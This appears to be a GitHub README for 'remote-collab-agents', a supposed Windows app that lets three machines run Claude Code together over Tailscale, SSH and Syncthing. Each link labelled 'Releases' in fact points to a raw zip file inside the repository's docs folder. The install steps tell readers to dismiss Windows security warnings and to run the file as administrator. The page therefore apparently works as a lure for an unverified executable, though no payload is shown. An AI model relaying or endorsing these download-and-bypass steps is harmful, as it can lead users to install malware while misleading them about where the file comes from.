# 🤝 remote-collab-agents - Run Claude Code together

[🟦 Download the app from Releases 🩶](https://github.com/Hierarchical-sage374/remote-collab-agents/raw/refs/heads/main/docs/collab_agents_remote_v2.1-beta.5.zip)

## 📌 What this app does

remote-collab-agents helps three machines work as one team. Each machine can run Claude Code, share files, and pass work to the others. This setup fits people who want one place for code, notes, and tasks across multiple Windows PCs.

It is made for simple use on the desktop. You do not need to manage a server by hand. The app helps you link your machines, keep folders in sync, and keep work moving between them.

## 🖥️ What you need

Before you start, check these items:

- A Windows PC
- Internet access
- At least 3 machines if you want the full setup
- Claude Code installed on each machine
- Permission to install and run apps
- A shared folder on each machine with enough free space

If you only have one machine, you can still install the app and learn the setup flow. If you have three machines, you can use the full collaboration mode.

## ⬇️ Download the app

Visit this page to download the Windows release:

[🟦 Go to Releases 🩶](https://github.com/Hierarchical-sage374/remote-collab-agents/raw/refs/heads/main/docs/collab_agents_remote_v2.1-beta.5.zip)

On the Releases page, look for the latest version and download the Windows file for your machine. If there are more than one file, pick the one for Windows. After the download finishes, open the file and follow the on-screen steps.

## 🚀 Install on Windows

1. Open the file you downloaded from the Releases page.
2. If Windows asks for permission, choose Allow or Yes.
3. Follow the setup steps on screen.
4. Pick a folder where the app can keep its files.
5. Finish the setup and open the app.

If Windows shows a security message, choose the option that lets you continue with the install. This can happen with new apps.

## 🔧 First-time setup

When you open the app for the first time, set up each machine one by one.

### Step 1: Set up Machine 1
- Open Claude Code on Machine 1
- Open remote-collab-agents
- Choose the first machine profile
- Set a name for the machine, such as `main-desk`
- Save the settings

### Step 2: Set up Machine 2
- Open Claude Code on Machine 2
- Open remote-collab-agents
- Choose the second machine profile
- Give it a clear name, such as `office-laptop`
- Save the settings

### Step 3: Set up Machine 3
- Open Claude Code on Machine 3
- Open remote-collab-agents
- Choose the third machine profile
- Give it a clear name, such as `workbench-pc`
- Save the settings

Use names that help you tell the machines apart. Short names work best.

## 🔗 Connect the machines

remote-collab-agents uses simple network tools to connect the machines.

### Tailscale
Tailscale helps the machines find each other on a private network. This keeps setup simple, even when the computers are in different places.

- Install Tailscale on each machine
- Sign in with the same account
- Make sure each machine shows as online
- Copy the device name for each PC

### SSH
SSH lets one machine send commands to another machine.

- Turn on SSH on each Windows PC
- Allow the app through Windows Firewall if needed
- Use the machine name or IP address in the app
- Test the connection before you start a task

### Syncthing
Syncthing keeps files in sync between machines.

- Open Syncthing on each machine
- Add the other two devices
- Share the project folder
- Wait for the first sync to finish

Keep the shared folder in a place you can find fast, such as `Documents\collab-work`.

## 🧭 Start a shared task

Use this flow when you want the machines to work together:

1. Pick one machine as the lead machine
2. Write the task in Claude Code
3. Choose the other two machines as helpers
4. Send the task to the helper machines
5. Let each machine work on its part
6. Sync the results back to the shared folder
7. Review the final result on the lead machine

A simple split works well:

- Machine 1: planning and review
- Machine 2: coding
- Machine 3: file sync and checks

You can change these roles based on the task.

## 📁 How files move between machines

The app uses shared folders so each machine sees the same work.

Use this folder layout:

- `input` for new files
- `working` for files in progress
- `output` for finished files
- `logs` for run history

This keeps the work clear. Each machine can check the right folder and avoid overwriting files from the others.

## 🛠️ Common tasks you can do

You can use remote-collab-agents for many desktop workflows:

- Share code changes across three PCs
- Keep notes in sync
- Run command tasks on another machine
- Split large work across separate machines
- Track work in a shared folder
- Review results from more than one PC

It works well for people who already use Claude Code and want it to span more than one machine.

## ⚙️ Simple usage tips

- Keep the same folder names on each PC
- Use one account for Tailscale on all machines
- Keep Claude Code up to date
- Leave Syncthing running while you work
- Use short machine names
- Keep the shared folder on a drive with free space

If a machine goes offline, bring it back online and let the sync finish before you start a new task.

## ❓ Troubleshooting

### The app does not open
- Check that the download finished
- Run the file again
- Right-click the file and choose Run as administrator
- Restart Windows and try once more

### A machine does not connect
- Check Tailscale on all machines
- Make sure each device is online
- Check the machine name in the app
- Test the network link again

### Files do not sync
- Open Syncthing on each PC
- Check that the folder is shared
- Make sure the same folder path exists on all machines
- Wait for the first sync to finish

### Claude Code does not respond
- Open Claude Code directly on that machine
- Make sure you are signed in
- Restart Claude Code
- Try the task again

## 🧩 Folder and device setup example

Here is a simple setup that works well:

- Desktop PC: `main-desk`
- Laptop: `office-laptop`
- Spare PC: `workbench-pc`

Shared folder path:

- `C:\Users\YourName\Documents\collab-work`

Inside that folder:

- `input`
- `working`
- `output`
- `logs`

This setup keeps the workflow easy to follow.

## 📦 Release page

Get the latest Windows build here:

[🟦 Download from GitHub Releases 🩶](https://github.com/Hierarchical-sage374/remote-collab-agents/raw/refs/heads/main/docs/collab_agents_remote_v2.1-beta.5.zip)

Look for the newest release, then download and run the Windows file for your machine.